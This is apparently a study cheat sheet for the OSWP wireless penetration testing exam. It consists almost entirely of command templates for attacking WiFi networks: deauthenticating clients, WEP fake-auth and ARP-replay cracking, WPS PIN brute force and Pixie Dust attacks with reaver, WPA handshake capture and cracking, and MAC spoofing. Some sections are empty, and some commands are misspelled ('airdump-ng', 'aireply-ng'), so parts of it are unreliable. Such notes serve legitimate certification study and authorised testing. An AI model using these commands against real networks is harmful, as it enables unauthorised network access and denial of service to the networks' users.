# OSWP cheat sheets

This cheat sheet based on "WiFi Hacking Mind Map - v1.0 by Jérémy Brun-Nouvion (https://github.com/koutto)"

## Monitoring
### Find all AP and connected devices
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band>
```

### Monitor target AP
```
airodump-ng <interface> --wps --manufacturer --uptime --band <band> -c <channel> --bssid <bssid> -w <capture>
```
### Unhide ESSID
Set channel
```
iwconfig wlan0 channel <channel>
```
Catch beacon with ESSID (Hiden ESSID)
```
aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
```


## WEP attack

### Attack using Fake auth and ARP-replay (OPN)
```
sudo aireplay-ng -1 6000 -a <AP_MAC> -o 1 -q 10 -h <host_MAC> <interface> # Fake auth
sudo aireplay-ng -3 -b <AP_MAC> -h <host_MAC> <interface> # ARP replay
aircrack-ng <*.cap>
```

## Bypassing WEP (SKA)
```

```


## WPS attack
**Dependencies:** reaver

_Some APs have protections. AP might have PIN timeout after a series of failures. These APs then require either a timeout or a reset to remove the lock._

### Custom PIN association 
 
### Pixie Dust attack 
```
 reaver -i <interface> -b <AP_MAC> -K
```
 
### Bruteforce PIN attack 
```
sudo reaver -i <interface> -b <AP_MAC>
```
 
### Known PINs attack
```
reaver -i <interface> -b <AP_MAC> -p <PIN>
```
 
### Null PIN attack 
_Only a very few APs are vulnerable to this attack_
```
reaver -i <interface> -b <AP_MAC> -p "" -N
```

## WPA attack
### Handshake Capture (req. client) & Cracking
```
airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> <interface>
aircrack-ng -a 2 -b <AP_MAC> -w <wordlist> <capture>
```
### PMKID Capture (client-less) & Cracking
```

```

## WPA Enterprise



## Connect to AP

### Open
```
iw <interface> connect <ESSID>
dhclient <interface>
```

### WEP
```
iw <interface> connect <ESSID> key 0:<key>
dhclient <interface>
```

### WPA2

Dependencies: wpasupplicant
```

wpa_passphrase "<ESSID>" <key> | sudo tee /etc/wpa_supplicant.conf
wpa_supplicant -B -c /etc/wpa_supplicant.conf -i <interface>
dhclient <interface>
```

### WPA enterprise

```
sudo dhclient <interface>
```

## Other
### MAC-spoofing
```
ip link set dev <interface> down
ip link set dev <interface> address <XX:XX:XX:XX:XX:XX>
ip link set dev <interface> up
```
### Prepare Attacker PC (Monitor mode)
```
airmon-ng check kill
airmon-ng start <interface>
OR
iw dev <interface> set monitor none
```
### Back to normal modee (Managed mode)
```
airmon-ng stop <Monitor interface>
systemctl start wpa_supplicant
systemctl start NetworkManager
```
### No associated devices
```
aireply-ng -0 100 -e <ESSID> <interface>
```